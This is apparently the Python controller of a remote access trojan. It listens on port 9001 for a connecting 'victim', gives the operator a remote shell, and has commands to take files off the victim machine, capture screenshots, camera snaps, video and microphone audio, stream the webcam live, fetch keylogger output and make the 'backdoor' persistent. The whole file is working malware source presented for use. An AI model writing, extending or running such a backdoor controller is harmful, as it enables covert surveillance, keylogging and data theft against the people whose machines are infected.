import base64
import json
import multiprocessing
import pickle
import socket
import struct
import threading

import cv2

sc_count = 10
cs_count = 10
vd_count = 10
mc_count = 10


# def reliable_send(data):
#     json_data = json.dumps(data)
#     target.send(json_data.encode())


# def reliable_recv():
#     json_data = ""
#     while True:
#         try:
#             json_data = json_data+(target.recv(1024)).decode()
#             return json.loads(json_data)
#         except ValueError:
#             continue
def reliable_send(msg):
    # Prefix each message with a 4-byte length (network byte order)
    msg = msg.encode()
    msg = struct.pack('>I', len(msg)) + msg
    target.sendall(msg)


def send_file(msg):
    msg = struct.pack('>I', len(msg)) + msg
    target.sendall(msg)


def recv_file():
    # Read message length and unpack it into an integer
    raw_msglen = recvall(target, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Read the message data
    result = recvall(target, msglen)
    return result


def reliable_recv():
    # Read message length and unpack it into an integer
    raw_msglen = recvall(target, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Read the message data
    result = recvall(target, msglen).decode()
    return result


def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data

def stream(stop):
    data = b""
    payload_size = struct.calcsize("Q")
    while True:
        while len(data) < payload_size:
            packet = target.recv(4*1024) # 4K
            if not packet: break
            data+=packet
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q",packed_msg_size)[0]
        
        while len(data) < msg_size:
            data += target.recv(4*1024)
        frame_data = data[:msg_size]
        data  = data[msg_size:]
        frame = pickle.loads(frame_data)
        cv2.imshow("RECEIVING VIDEO",frame)
        key = cv2.waitKey(1) & 0xFF
        if key  == ord('q') or stop():
            # reliable_send("stop_stream")
            break
    

def shell():
    global count
    global sc_count
    global cs_count
    global vd_count
    global mc_count

    OKGREEN = '\033[92m'
    WARNING = '\033[91m'
    ENDC = '\033[0m'
    stop_threads = False
    stream_thread = threading.Thread(target=stream, args =(lambda : stop_threads, ))

    while True:
        command = input("Shell#~"+str(ip)+": ")
        reliable_send(command)
        if command == "q":
            break

        elif command == "help":
            options = '''\n\t\t    ============================ HELP ================================
                    download <path>    ==> Download a file from the victim machine
                    upload <path>      ==> Upload a file to the victim machine
                    get <URL>          ==> Upload a file from internet to the victim machine
                    screenshot         ==> Take a screenshot 
                    cam_snap           ==> Take a camera snap  
                    video <time>       ==> Capture video (time in seconds) 
                    mic <time>         ==> Voice recorder (time in seconds)
                    stream             ==> Real time camera streaming 
                    keylog             ==> Start keylog program
                    dump_keylog        ==> Get the keylog file
                    persistance        ==> Make the backdoot persistant
                    check              ==> Check for root privileges 
                    wallpaper <path>   ==> Change the wallpaper  
                    webbrowser <url>   ==> Open a web browser
                    q                  ==> quit session
                    =================================================================\n'''
            print(OKGREEN+options+ENDC)

        elif command[:2] == "cd" and len(command) > 1:
            continue
        
        elif command[:8] == "download":
            with open(command[9:], "wb") as file:
                result = recv_file()
                err=result[:15].decode()
                if err[:11]=="[!!] Failed":
                    print(WARNING+result.decode()+ENDC)
                file.write(result)

        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as fin:
                    send_file(fin.read())
            except:
                reliable_send("[!!] Failed to upload")

        elif command[:10] == "screenshot":
            with open("screenshot%d.png" % sc_count, "wb") as screen:
                image = recv_file()
                image_decoded = image
                if image_decoded[:4] == "[!!]":
                    print(WARNING+ image_decoded+ ENDC)
                else:
                    screen.write(image_decoded)
                    sc_count += 1

        elif command[:8] == "cam_snap":
            with open("cam%d.png" % cs_count, "wb") as screen:
                image = recv_file()
                image_decoded = image
                if image_decoded[:4] == "[!!]":
                    print(WARNING+ image_decoded+ ENDC)
                else:
                    screen.write(image_decoded)
                    cs_count += 1

        elif command[:5] == "video":
            with open("vid%d.mp4" % vd_count, "wb") as screen:
                image = recv_file()
                image_decoded = image
                if image_decoded[:4] == "[!!]":
                    print(WARNING+ image_decoded+ ENDC)
                else:
                    screen.write(image_decoded)
                    vd_count += 1

        elif command[:3] == "mic":
            with open("mic%d.wav" % mc_count, "wb") as screen:
                image = recv_file()
                image_decoded = image
                if image_decoded[:4] == "[!!]":
                    print(WARNING+ image_decoded+ ENDC)
                else:
                    screen.write(image_decoded)
                    mc_count += 1

        elif command[:6] == "stream":
            stream_thread.start()

        elif command[:11] == "stop_stream":
            stop_threads = True
            reliable_send("stop_stream")
            stream_thread.join()

        elif command[:6] == "keylog":
            continue

        elif command[:11] == "dump_keylog":
            with open("logger.txt", "wb") as sc:
                img = recv_file()
                sc.write(img)

        elif command[:11] == "persistance":
            continue

        else:
            result = reliable_recv()
            if result[:4] == "[!!]":
                print(WARNING+ result+ ENDC)
            else:
                print(OKGREEN+ result+ ENDC)
                


def server():
    global s
    global ip
    global target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 9001)) # ngrok tcp 9001
    s.listen(5)
    print("Listening for Incoming connections on port 9001")
    target, ip = s.accept()
    print("Target connected")


server()
shell()
s.close()
